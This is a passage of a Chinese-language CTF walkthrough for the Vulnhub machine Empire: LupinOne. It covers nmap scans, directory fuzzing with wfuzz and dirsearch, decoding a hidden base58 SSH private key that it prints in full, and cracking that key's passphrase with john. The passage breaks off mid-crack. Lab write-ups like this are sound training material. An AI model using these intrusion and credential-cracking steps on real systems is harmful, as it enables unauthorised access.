{"pageProps":{"postData":{"id":"VulnhubEmpire LupinOne","contentHtml":"<h1>Empire: LupinOne</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/empire-lupinone,750/\">https://www.vulnhub.com/entry/empire-lupinone,750/</a></p>\n</blockquote>\n<p>描述：CTF like box. You have to enumerate as much as you can. 需要很多枚举</p>\n<h2>端口扫描主机发现</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>182</code>是靶机</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>                   \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-05 10:04 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00016</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00011</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.182</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00019</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">7</span>C:<span class=\"hljs-title function_ invoke__\">F5</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00033</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FE:CA:<span class=\"hljs-number\">7</span>A (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\n</code></pre>\n</li>\n<li>\n<p>探测主机所有开放端口，仅存在<code>80</code>端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.182</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-05 10:05 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.182</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0010</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">7</span>C:<span class=\"hljs-title function_ invoke__\">F5</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>探测服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.182</span>    \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-05 10:07 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.182</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0012</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">8.4</span>p1 Debian <span class=\"hljs-number\">5</span> (protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">48</span> ((Debian))\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">7</span>C:<span class=\"hljs-title function_ invoke__\">F5</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">4</span>.X|<span class=\"hljs-number\">5</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.8</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.182</span> \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-05 <span class=\"hljs-number\">10</span>:08 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.182</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.0050</span>s latency).\n\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> DOM based XSS.\n| http-enum: \n|   /robots.txt: Robots file\n|   /image/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.48 (debian)'</span>\n|_  /manual/: Potentially interesting folder\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\nMAC Address: 00:0C:29:15:7C:F5 (VMware)\n</span></code></pre>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>访问主页，就一张照片</p>\n<p><img src=\"/post-images/VulnhubEmpire%20LupinOne/image62.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>因为说需要多的枚举，我们尝试使用<code>binwalk</code>分离照片，但是没有分离出来</p>\n</li>\n<li>\n<p>扫描目录</p>\n<pre><code class=\"hljs language-python\">dirsearch -u <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.182</span> -x <span class=\"hljs-number\">403</span>,<span class=\"hljs-number\">404</span>\n//\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">10</span>] Starting:                                                                                                                                         \n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">41</span>] <span class=\"hljs-number\">301</span> -  316B  - /image  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.182</span>/image/          \n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">42</span>] <span class=\"hljs-number\">301</span> -  321B  - /javascript  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.182</span>/javascript/\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">46</span>] <span class=\"hljs-number\">301</span> -  317B  - /manual  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.182</span>/manual/        \n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">46</span>] <span class=\"hljs-number\">200</span> -  208B  - /manual/index.html                                \n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">57</span>] <span class=\"hljs-number\">200</span> -   34B  - /robots.txt      \n</code></pre>\n<ul>\n<li>\n<p><code>robots.txt</code> ，给了新路径</p>\n<pre><code class=\"hljs language-python\">User-agent: *\nDisallow: /~myfiles\n</code></pre>\n<p>访问 <code>/~myfiles</code></p>\n<pre><code class=\"hljs language-python\">Error <span class=\"hljs-number\">404</span>\n Your can do it, keep trying. \n</code></pre>\n<p>可能会存在什么，因为~在旧的<code>apache</code>中是表示用户目录</p>\n</li>\n<li>\n<p><code>/manual</code> 跳转到<code>apache</code>服务器文档，进入时时选择语言，默认重定向到<code>en</code></p>\n</li>\n</ul>\n</li>\n<li>\n<p>通过<code>robots.txt</code>给的提示，混淆一下是否存在别的目录</p>\n<pre><code class=\"hljs language-python\">wfuzz -c -w /usr/share/wfuzz/wordlist/general/big.txt --hh <span class=\"hljs-number\">276</span> http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.182</span>/~FUZZ/\n********************************************************\n* Wfuzz <span class=\"hljs-number\">3.1</span><span class=\"hljs-number\">.0</span> - The Web Fuzzer                         *\n********************************************************\nTarget: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.182</span>/~FUZZ/\nTotal requests: <span class=\"hljs-number\">3024</span>\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                     \n=====================================================================\n000002402:   <span class=\"hljs-number\">200</span>        <span class=\"hljs-number\">5</span> L      <span class=\"hljs-number\">54</span> W       <span class=\"hljs-number\">331</span> Ch      <span class=\"hljs-string\">\"secret\"</span>                                                                                    \nTotal time: <span class=\"hljs-number\">0</span>\nProcessed Requests: <span class=\"hljs-number\">3024</span>\nFiltered Requests: <span class=\"hljs-number\">3023</span>\nRequests/sec.: <span class=\"hljs-number\">0</span>\n</code></pre>\n<p>发现新的<code>~secret</code> 目录，访问</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># http://192.168.75.182/~secret/</span>\nHello Friend, Im happy that you found my secret diretory, I created like this to share <span class=\"hljs-keyword\">with</span> you my create ssh private key file,\nIts hided somewhere here, so that hackers dont find it <span class=\"hljs-keyword\">and</span> crack my passphrase <span class=\"hljs-keyword\">with</span> fasttrack.\nI<span class=\"hljs-string\">'m smart I know that.\nAny problem let me know\nYour best friend icex64 \n</span></code></pre>\n<p>说在当前目录下隐藏了<code>ssh</code>的私钥文件，并且可以使用<code>fasttrack</code>字典来破解，并且知道用户是<code>icex64</code></p>\n</li>\n<li>\n<p>再使用<code>wfuzz</code>混淆，文件名前加<code>.</code> 表示文件是隐藏的</p>\n<pre><code class=\"hljs language-python\">**wfuzz -c -w /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt --hh <span class=\"hljs-number\">276</span> http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.182</span>/~secret/.FUZZ.txt** \n</code></pre>\n<p>发现文件 <code>/~secret/.mysecret.txt</code> ，访问是一片貌似<code>base64</code>的文字</p>\n<pre><code class=\"hljs language-python\">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\n</code></pre>\n</li>\n<li>\n<p>使用<code>base64</code>解码，但是解开是乱码，再尝试<code>base58</code></p>\n<pre><code class=\"hljs language-python\">curl http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.182</span>/~secret/.mysecret.txt | base58 --decode\n//\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp\nPBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk\n9GXiytplgT9z/mP91NqOU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9\nH6NSb0jMbMc4soFrBinoLEkx894B/PqUTODesMEV/aK22UKegdwlJ9Arf+1Y48V86gkzS6\nxzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7\nJ0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0/nRfCaOrIzPfZ/NNYgu\n/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0\nZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I\nhe0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf\nXdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA\nhzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr/66Ma4e6iwPLqmtzt3UiFGb\n4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq\nmXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp\nMkMcBnzD9uynCjhZ9ijaPY/vMY7mtHZNCY8SeoWAxYXToKy2cu/+pVyGQ76KYt3J0AT7wA\n2OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG/b7z6zGvVxZca/g572CXxXSXlb\nQOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+34tK+kUoEaVAbwU+IchYyM8ZarSvHVpE\nvFUPiANSHCZ/b+pdKQtBzTk5/VH/Jk3QPcH69EJyx8/gRE/glQY6z6nC6uoG4AkIl+gOxZ\n0hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPft\nrqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB\nQMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy\nx+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjG\nnx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5\nVQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO\ncNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh\nnEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm\n8UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+<span class=\"hljs-number\">4</span>/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH\nzcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw\nn49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl\nAbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93\noVb4p/rHHqqPNMNwM1ns+adF7REjzFwr4/trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI\n63RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV\ny7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+\nt/YYhQ/r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2\nAys8pHGynylFMDTn13gPJTYJhLDO4H9+7dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU\nyviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI\n8nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU\nmUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+4Qa4+oVk9ZluLBxeu22r\nVgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x/IUt/FP8Nq964pD7m/dPHQ\nE8/oh4V1NTGWrDsK3AbLk/MrgROSg7Ic4BS/8IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ\nBHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+31qP80O/+Kk9NUWalsz+6Kt2\nyueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+\nwDSuOKenqc71GfvgmVOUypYTtoI527fiF/9rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P\n5KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8\nvTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ\nQb50sQsJUxKkuMyfvDQC9wyhYnH0/4m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB\n1bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB\nECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/4ORlsC\niUJ66WmRUN9EoVlkeCzQJwivI=\n-----END OPENSSH PRIVATE KEY-----  \n</code></pre>\n<p>是一个私钥文件，将它存为<code>prikey</code></p>\n</li>\n<li>\n<p>根据上面的提示还可以知道可以用<code>fasttrack</code>来破解密码</p>\n<ul>\n<li>\n<p>将SSH 私钥转换为 John the Ripper 可用的哈希格式，从而用 <code>john</code> 来进行暴力破解</p>\n<pre><code class=\"hljs language-python\">python /usr/share/john/ssh2john.py prikey > key\n</code></pre>\n</li>\n<li>\n<p>使用<code>fasttrack</code>字典爆破，破解出密码<code>P@55w0rd!</code></p>\n<pre><code class=\"hljs language-python\">john --wordlist=/usr/share/wordlists/fasttrack.txt key                         \nUsing default <span class=\"hljs-built_in\">input</span> encoding: UTF-<span class=\"hljs-number\">8</span>\nLoaded <span class=\"hljs-number\">1</span> password <span class=\"hljs-built_in\">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH <span class=\"hljs-number\">32</span>/<span class=\"hljs-number\">64</span>])\nCost <span class=\"hljs-number\">1</span> (KDF/cipher [<span class=\"hljs-number\">0</span>=MD5/AES <span class=\"hljs-number\">1</span>=MD5/3DES <span class=\"hljs-number\">2</span>=Bcrypt/AES]) <span class=\"hljs-keyword\">is</span> <span class=\"hljs-number\">2</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">all</span> loaded hashes\nCost <span class=\"hljs-number\">2</span> (iteration count) <span class=\"hljs-keyword\">is</span> <span class=\"hljs-number\">16</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">all</span> loaded hashes\nWill run <span class=\"hljs-number\">8</span> OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> <span class=\"hljs-keyword\">or</span> Ctrl-C to abort, almost <span 